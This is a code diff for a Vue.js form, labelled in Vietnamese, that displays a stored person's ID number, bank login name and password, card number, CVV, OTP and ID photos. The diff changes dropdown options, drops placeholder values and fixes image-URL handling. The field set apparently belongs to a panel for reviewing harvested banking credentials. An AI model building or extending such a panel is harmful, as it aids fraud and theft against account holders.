@@ -51,14 +51,14 @@
                     </VCol>
                     <VCol cols="12" md="6">
                         <VSelect v-model="formValue.typeCard" label="Loại thẻ đang cần làm" outlined
-                            :items="['Thẻ tín dụng', 'Thẻ ghi nợ', 'Thẻ GIF']" />
+                            :items="['Thẻ tín dụng', 'Thẻ ghi nợ', 'Thẻ trả trước']" />
                     </VCol>
                     <VCol cols="12" md="6">
                         <VSelect v-model="formValue.cardType" label="Loại thẻ đang sử dụng" outlined :items="[
-                            'Thẻ tín dụng',
-                            'Thẻ ghi nợ',
-                            'Thẻ GIF',
-                            'Thẻ nội địa'
+                            'Thẻ ghi nợ Napas',
+                            'Thẻ ghi nợ Visa',
+                            'Thẻ ghi nợ Mastercard',
+                            'Thẻ tín dụng Jcb',
                         ]" />
                     </VCol>
                     <VCol cols="12" md="6">
@@ -112,27 +112,7 @@ const otpNew = ref('');
 const statusXD = ref('');
 const statusTV = ref('');
 const formValue = ref({
-    _id: '1',
-    fullName: 'Nguyễn Văn A',
-    cccd: '123456789',
-    bankName: 'Vietcombank',
-    bankAccount: '123456789',
-    bankPassword: '123456789',
-    numberPhone: '123456789',
-    typeCard: 'Thẻ tín dụng',
-    CardType: 'Thẻ nội địa',
-    cardNumber: '123456789',
-    cardOwwner: 'Nguyễn Văn A',
-    CardDate: '123456789',
-    CardCvv: '123456789',
-    image: 'https://via.placeholder.com/150',
-    imageBefore: 'https://via.placeholder.com/150',
-    imageAfter: 'https://via.placeholder.com/150',
-    bankLoginName: 'Nguyễn Văn A',
-    bankLoginPassword: '123456789',
-    bankLoginAccount: '123456789',
     actions: null,
-
 });
 
 
@@ -144,9 +124,15 @@ const user = ref(null);
 onMounted(() => {
     axios.get(`/get-user/${userId.value}`)
         .then(({ data }) => {
-            data.imageBefore = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
-            data.imageAfter = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
-            data.image = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
+            if (data.imageBefore) {
+                data.imageBefore = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
+            }
+            if (data.imageAfter) {
+                data.imageAfter = `${import.meta.env.VITE_IMAGE_URL}/${data.imageAfter.replace('public/', 'uploads/')}`;
+            }
+            if (data.image) {
+                data.image = `${import.meta.env.VITE_IMAGE_URL}/${data.image.replace('public/', 'uploads/')}`;
+            }
             user.value = data;
             formValue.value = data;
             console.log('user', formValue.value);
